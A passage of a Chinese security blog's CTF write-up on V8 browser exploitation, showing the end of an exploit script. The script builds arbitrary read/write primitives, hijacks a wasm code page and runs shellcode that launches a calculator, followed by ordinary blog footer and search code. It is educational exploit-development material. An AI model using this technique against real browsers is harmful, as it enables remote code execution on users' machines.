class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule,&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]f addr : "</span> + hex(f_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]leaked double arr maps : "</span> + hex(f2i(double_arr_map)));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]leaked obj arr maps : "</span> + hex(f2i(obj_arr_map)));</span><br><span class="line"><span class="comment">//--------------------------arbRead/arbWrite----------------------</span></span><br><span class="line"><span class="keyword">var</span> double_arr_addr = addressOf(double_arr);</span><br><span class="line"><span class="comment">//making the fake array to fakeObj</span></span><br><span class="line"><span class="comment">//step1. calculate the address of fake_arr_elements</span></span><br><span class="line">elements_addr = double_arr_addr + <span class="number">0x10</span> * <span class="number">6</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]elements addr is : "</span> + hex(elements_addr));</span><br><span class="line">double_arr[<span class="number">1</span>] = double_arr_map;</span><br><span class="line">double_arr[<span class="number">2</span>] = i2f(<span class="number">0</span>);</span><br><span class="line">double_arr[<span class="number">3</span>] = i2f(elements_addr+<span class="number">1</span>);</span><br><span class="line">double_arr[<span class="number">4</span>] = i2f(<span class="number">0x1000000000</span>);  </span><br><span class="line"><span class="comment">//following will make a new elements which not same as we calculted before!</span></span><br><span class="line"><span class="comment">// double_arr = [</span></span><br><span class="line"><span class="comment">//   double_arr_map,           //maps</span></span><br><span class="line"><span class="comment">//   i2f(0x0),                 //prototype</span></span><br><span class="line"><span class="comment">//   i2f(elements_addr+0x11),  //fake_elements</span></span><br><span class="line"><span class="comment">//   i2f(0x2),                 //length</span></span><br><span class="line"><span class="comment">//   1.1,                      //fake data</span></span><br><span class="line"><span class="comment">//   2.2                        //fake data</span></span><br><span class="line"><span class="comment">// ]</span></span><br><span class="line"><span class="keyword">var</span> fake_obj = fakeObj(elements_addr+<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]faked obj addr : "</span> + hex(addressOf(fake_obj)));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  double_arr[<span class="number">3</span>] = i2f(addr<span class="number">-0x10</span>+<span class="number">1</span>);</span><br><span class="line">  <span class="comment">// %DebugPrint(fake_obj);</span></span><br><span class="line">  <span class="comment">// %DebugPrint(double_arr);</span></span><br><span class="line">  <span class="comment">// %SystemBreak();</span></span><br><span class="line">  <span class="keyword">var</span> res = fake_obj[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// %DebugPrint(fake_obj);</span></span><br><span class="line">  <span class="comment">// %DebugPrint(double_arr);</span></span><br><span class="line">  <span class="comment">// %SystemBreak();</span></span><br><span class="line">  double_arr[<span class="number">3</span>] = i2f(elements_addr+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> f2i(res)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbWrite</span>(<span class="params">addr,val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  double_arr[<span class="number">3</span>] = i2f(addr<span class="number">-0x10</span>+<span class="number">1</span>);</span><br><span class="line">  fake_obj[<span class="number">0</span>] = i2f(val);</span><br><span class="line">  double_arr[<span class="number">3</span>] = i2f(elements_addr+<span class="number">0x11</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbRead(f_addr+<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]shared info addr : "</span> + hex(shared_info_addr));</span><br><span class="line">code_addr = arbRead(shared_info_addr+<span class="number">8</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]code addr : "</span> + hex(code_addr));</span><br><span class="line">wasm_addr = arbRead(code_addr+<span class="number">0x70</span>+<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]wasm addr : "</span> + hex(wasm_addr));</span><br><span class="line"><span class="comment">//--------------------get shell----------------------</span></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">128</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="comment">//getMethods(data_view);</span></span><br><span class="line">backing_store_addr = addressOf(data_buf)+<span class="number">0x20</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]backing store addr : "</span> + hex(backing_store_addr));</span><br><span class="line"><span class="keyword">let</span> sc=[<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line">arbWrite(backing_store_addr,wasm_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]hijacked the backing store addr."</span>);</span><br><span class="line"><span class="comment">// %DebugPrint(data_buf);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; sc.length; i++)&#123;</span><br><span class="line">  data_view.setUint8(i,sc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]hijacked the wasm addr."</span>);</span><br><span class="line"><span class="comment">// %DebugPrint(data_buf);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line">f();</span><br><span class="line"><span class="comment">//%DebugPrint(oobArray);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure>

      
    </div>

    

    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的支持将鼓励我继续创作</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
        <p>Alipay</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/v8/" rel="tag"># v8</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/03/17/d3ctf/" rel="next" title="D^3CTF VMWare Esacpe RealVM题解">
                <i class="fa fa-chevron-left"></i> D^3CTF VMWare Esacpe RealVM题解
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/05/26/34c3-v9/" rel="prev" title="34c3 CTF v9题解">
                34c3 CTF v9题解 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
            
              <p class="site-author-name" itemprop="name">ama2in9</p>
              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">82</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">33</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/xmzyshypnc" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://linkleyping.top/" title="Ep" target="_blank">Ep</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://keenan.top/" title="keenan" target="_blank">keenan</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://021w.github.io/" title="021w" target="_blank">021w</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#浏览器基础"><span class="nav-number">1.</span> <span class="nav-text">浏览器基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web浏览器结构"><span class="nav-number">1.1.</span> <span class="nav-text">web浏览器结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见浏览器的结构"><span class="nav-number">1.1.1.</span> <span class="nav-text">常见浏览器的结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用的学习方法"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用的学习方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V8"><span class="nav-number">1.3.</span> <span class="nav-text">V8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编译器流程"><span class="nav-number">1.3.1.</span> <span class="nav-text">编译器流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译器历史"><span class="nav-number">1.3.2.</span> <span class="nav-text">编译器历史</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TurboFan"><span class="nav-number">1.3.3.</span> <span class="nav-text">TurboFan</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sea-of-Nodes"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">Sea of Nodes</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Optimization-phase"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">Optimization phase</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Range-types"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">Range types</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CheckBounds-nodes"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">CheckBounds nodes</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Simplified-lowering"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">Simplified lowering</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#addition-opcodes"><span class="nav-number">1.3.3.6.</span> <span class="nav-text">addition opcodes</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TurboFan优化总结"><span class="nav-number">1.3.3.7.</span> <span class="nav-text">TurboFan优化总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#v8对象"><span class="nav-number">1.3.4.</span> <span class="nav-text">v8对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dictionary-mode"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">Dictionary mode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fast-in-object-properties"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">Fast,in-object properties</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#In-object-slack-tracking"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">In-object slack tracking</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Methods-and-prototypes"><span class="nav-number">1.3.4.4.</span> <span class="nav-text">Methods and prototypes</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Numbered-properties-fast-elements"><span class="nav-number">1.3.4.5.</span> <span class="nav-text">Numbered properties: fast elements</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对象模型"><span class="nav-number">1.3.5.</span> <span class="nav-text">对象模型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Object-amp-amp-Tagged-Object"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">Object &amp;&amp; Tagged Object</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Smi"><span class="nav-number">1.3.5.1.1.</span> <span class="nav-text">Smi</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HeapObject"><span class="nav-number">1.3.5.1.2.</span> <span class="nav-text">HeapObject</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GC"><span class="nav-number">1.3.6.</span> <span class="nav-text">GC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF题目"><span class="nav-number">1.3.7.</span> <span class="nav-text">CTF题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF-2019-OOB"><span class="nav-number">1.3.7.1.</span> <span class="nav-text">*CTF 2019 OOB</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数字经济云安全大赛-Browser"><span class="nav-number">1.3.7.2.</span> <span class="nav-text">数字经济云安全大赛 Browser</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#roll-a-d8"><span class="nav-number">1.3.7.3.</span> <span class="nav-text">roll_a_d8</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.3.7.3.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.3.7.3.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.7.3.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#elements"><span class="nav-number">1.3.7.3.4.</span> <span class="nav-text">elements</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#踩坑"><span class="nav-number">1.3.7.3.5.</span> <span class="nav-text">踩坑</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#addressOf原语"><span class="nav-number">1.3.7.3.6.</span> <span class="nav-text">addressOf原语</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fakeObj原语"><span class="nav-number">1.3.7.3.7.</span> <span class="nav-text">fakeObj原语</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-js"><span class="nav-number">1.3.7.4.</span> <span class="nav-text">exp.js</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ama2in9</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  

  
    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
  

  
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'http://ama2in9.top/2021/05/13/v8-basic/';
        this.page.identifier = '2021/05/13/v8-basic/';
        this.page.title = '浏览器基础';
        };
      function loadComments () {
        var d = document, s = d.createElement('script');
        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      }
      
        loadComments();
      
    </script>
  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
        placeholder: 'Just go go',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: true
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
